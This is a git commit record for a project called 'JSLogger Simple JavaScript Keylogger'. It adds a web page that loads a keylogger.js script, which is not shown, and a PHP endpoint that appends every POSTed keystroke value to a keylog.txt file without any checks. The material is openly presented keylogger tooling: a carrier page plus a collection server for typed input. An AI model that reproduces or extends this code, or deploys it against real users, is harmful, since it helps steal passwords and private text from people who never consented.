7f105374017fc7b4cf71a5897bfd04e9946d39c2
ufukugurr <ufukugur97@gmail.com>
2014-06-24 20:14:04 +0300

    JSLogger Simple JavaScript Keylogger

---
+++ index.php
@@ -0,0 +1,11 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+	<script src="keylogger.js"></script>
+</head>
+<body>
+	<center><h1>JSLogger</h1></center>
+</body>
+</html>
---
+++ jslogger.php
@@ -0,0 +1,6 @@
+<?php
+$key = $_POST['key'];
+$logfile = "keylog.txt";
+$fp = fopen($logfile, "a");
+fwrite($fp, $key);
+fclose($fp);
